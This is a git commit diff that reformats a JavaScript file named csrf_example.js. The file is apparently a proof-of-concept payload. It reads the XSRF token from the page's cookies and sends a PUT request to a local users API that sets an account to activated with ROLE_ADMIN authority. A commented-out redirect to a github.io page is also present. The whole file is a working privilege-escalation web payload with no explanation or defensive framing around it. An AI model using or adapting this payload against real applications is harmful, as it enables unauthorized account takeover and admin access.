be180aea3f719ef4cfbc8a30ebfc201835f57449
May PST <83545584+GrannyCat@users.noreply.github.com>
2023-11-17 15:56:44 +0630

    Update csrf_example.js

--- csrf_example.js
+++ csrf_example.js
@@ -1,24 +1,22 @@
 function executeScript() {
-  fetch('http://localhost:8080/api/users',
-  {
+  fetch('http://localhost:8080/api/users', {
     method: 'PUT',
     headers: {
       'Content-Type': 'application/json',
-      'X-XSRF-Token': document.cookie.valueOf('XSRF-TOKEN').split("=")[1],
-
-  },
-  body:JSON.stringify({
-  id:12,
-  "activated" : true,
-  "authorities": ["ROLE_ADMIN", "ROLE_USER"],
-  login:'newuser101',
-  firstName:'new101',
-  lastName: 'user101',
-  email:'user101@localhost',
-}),
-})
-.then(response =>response.text())
-.then(data=>console.log(data))
-//.then(window.location.href = 'https://grannycat.github.io/mayphyu.github.io')
-.catch(error=>console.error('Error', error));
+      'X-XSRF-Token': document.cookie.split('XSRF-TOKEN=')[1], // Extracting the token correctly
+    },
+    body: JSON.stringify({
+      id: 12,
+      activated: true,
+      authorities: ['ROLE_ADMIN', 'ROLE_USER'],
+      login: 'newuser101',
+      firstName: 'new101',
+      lastName: 'user101',
+      email: 'user101@localhost',
+    }),
+  })
+    .then((response) => response.text())
+    .then((data) => console.log(data))
+    // .then(() => window.location.href = 'https://grannycat.github.io/mayphyu.github.io')
+    .catch((error) => console.error('Error', error));
 }
